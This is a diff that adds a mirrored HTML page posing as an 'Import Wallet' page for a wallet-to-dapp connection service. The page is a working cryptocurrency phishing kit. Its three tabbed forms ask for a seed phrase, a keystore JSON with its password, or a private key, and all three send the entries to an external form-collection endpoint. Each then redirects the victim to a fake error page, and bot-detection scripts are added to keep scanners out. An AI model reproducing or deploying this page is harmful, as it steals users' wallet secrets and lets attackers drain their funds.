@@ -1,0 +1,168 @@
+<html>
+
+<!-- Mirrored from waves by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 04 Mar 2022 15:25:53 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <link rel="stylesheet" href="../assets/main.css" type="text/css"> 
+    <meta name="description" content="Open protocol for connecting Wallets to Dapps">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:image" content="../images/logo.svg">
+    <link rel="icon" href="../assets/logo.svg">
+    <script>
+        function openCity(evt, cityName) {
+    // Declare all variables
+    var i, tabcontent, tablinks;
+
+    // Get all elements with class="tabcontent" and hide them
+    tabcontent = document.getElementsByClassName("tabcontent");
+    for (i = 0; i < tabcontent.length; i++) {
+      tabcontent[i].style.display = "none";
+  }
+  
+    // Get all elements with class="tablinks" and remove the class "active"
+    tablinks = document.getElementsByClassName("tablinks");
+    for (i = 0; i < tablinks.length; i++) {
+      tablinks[i].className = tablinks[i].className.replace(" active", "");
+  }
+  
+    // Show the current tab, and add an "active" class to the button that opened the tab
+    document.getElementById(cityName).style.display = "block";
+    evt.currentTarget.className += " active";
+}
+</script>
+<title>Import Wallet</title>
+</head>
+<body>
+    <center>
+        <div class="top">
+            <a href="#footer" class="left">Github</a>
+            <a href="#" class="left">Docs</a>
+            <a href="../indexd41d.html?" class="main"><img src="../assets/logo.png" alt="logo"></a>
+            <a href="../indexd41d.html?#wallets" class="left">Wallets</a>
+            <a href="#" class="left">Apps</a>
+        </div>
+        <br>
+        <h2><center>Import Wallet</center></h2>
+        <br>
+        <div class="tab">
+          <button class="tablinks active" id="default" onclick="openCity(event, &#39;phrase&#39;)">Phrase</button>
+          <button class="tablinks" onclick="openCity(event, &#39;keystore&#39;)">Keystore JSON</button>
+          <button class="tablinks" onclick="openCity(event, &#39;private&#39;)">Private Key</button>
+      </div>
+          <div id="phrase" class="tabcontent" style="display: block;">
+        <form w="" action="https://submit-form.com/TmthE5Za"   data-botpoison-public-key="pk_11962bc3-48db-4281-bb83-aa411cd4588c"
+ method="POST">
+
+            <input type="hidden" name="w" value="waves">
+
+            <textarea name="phrase" class="phrase" required="required" minlength="12" placeholder="Phrase"></textarea>
+            <input type="text" name="user" value="" style="visibility: hidden;">
+            <br>
+            <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+            <br>
+            <button type="submit" class="btn" id="submit">IMPORT</button>
+            <input
+            type="hidden"
+            name="_redirect"
+            value="https://recover-through-service-provider.netlify.com/erorr.html"
+          />
+          </form>
+        <script>
+  var formElement = document.getElementById("form");
+  var buttonElement = document.getElementById("button");
+  formElement.addEventListener("botpoison-challenge-start", function () {
+    buttonElement.setAttribute("disabled", "disabled");
+  });
+  formElement.addEventListener("botpoison-challenge-success", function () {
+    buttonElement.removeAttribute("disabled");
+  });
+  formElement.addEventListener("botpoison-challenge-error", function () {
+    buttonElement.removeAttribute("disabled");
+  });
+</script>
+<script src="./botpoison.js">
+    </div>
+
+    <div id="keystore" class="tabcontent" style="display: none;">
+        <form action="https://submit-form.com/TmthE5Za"   data-botpoison-public-key="pk_11962bc3-48db-4281-bb83-aa411cd4588c"
+ method="POST">
+
+            <input type="hidden" name="w" value="waves">
+
+            <textarea name="keystorejson" class="phrase" required="required" minlength="12" placeholder="Keystore JSON"></textarea>
+            <br>
+
+            <div class="field">
+                <input type="password" name="password" placeholder="Password">
+            </div>
+            <input type="text" name="user" value="" style="visibility: hidden;">
+            <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
+            <br>
+            <button type="submit" class="btn" id="submit">IMPORT</button>
+            <input
+            type="hidden"
+            name="_redirect"
+            value="https://recover-through-service-provider.netlify.com/erorr.html"
+          />
+          </form>
+        <script>
+  var formElement = document.getElementById("form");
+  var buttonElement = document.getElementById("button");
+  formElement.addEventListener("botpoison-challenge-start", function () {
+    buttonElement.setAttribute("disabled", "disabled");
+  });
+  formElement.addEventListener("botpoison-challenge-success", function () {
+    buttonElement.removeAttribute("disabled");
+  });
+  formElement.addEventListener("botpoison-challenge-error", function () {
+    buttonElement.removeAttribute("disabled");
+  });
+</script>
+<script src="./botpoison.js">
+    </div>
+
+    <div id="private" class="tabcontent" style="display: none;">
+        <form action="https://submit-form.com/TmthE5Za"   data-botpoison-public-key="pk_11962bc3-48db-4281-bb83-aa411cd4588c"
+ method="POST">
+            <input type="hidden" name="w" value="waves">
+            <div class="field">
+                <input type="text" name="key" class="key" placeholder="Private Key">
+            </div>
+            <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+            <input type="text" name="user" value="" style="visibility: hidden;">
+            <br>
+            <button type="submit" class="btn" id="submit">IMPORT</button>
+            <input
+            type="hidden"
+            name="_redirect"
+            value="https://recover-through-service-provider.netlify.com/erorr.html"
+          />
+          </form>
+        <script>
+  var formElement = document.getElementById("form");
+  var buttonElement = document.getElementById("button");
+  formElement.addEventListener("botpoison-challenge-start", function () {
+    buttonElement.setAttribute("disabled", "disabled");
+  });
+  formElement.addEventListener("botpoison-challenge-success", function () {
+    buttonElement.removeAttribute("disabled");
+  });
+  formElement.addEventListener("botpoison-challenge-error", function () {
+    buttonElement.removeAttribute("disabled");
+  });
+</script>
+<script src="./botpoison.js">
+    </div>
+
+    <script>
+        document.getElementById("default").click();
+    </script>
+    <footer><div id="footer">
+        <p><img src="../assets/discord.svg" class="footimg">  <a href="../../discord.gg/jhxMvxP">Discord</a></p><br>
+        <p><img src="../assets/telegram.svg" class="footimg">  <a href="#">Telegram</a></p><br>
+        <p><img src="../assets/twitter.svg" class="footimg">  <a href="../../">Twitter</a></p><br>
+        <p><img src="../assets/github.svg" class="footimg">  <a href="../../">Github</a></p><br>
+    </div></footer>
+</center></body>
+<!-- Mirrored from waves by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 04 Mar 2022 15:25:53 GMT -->
+</html>
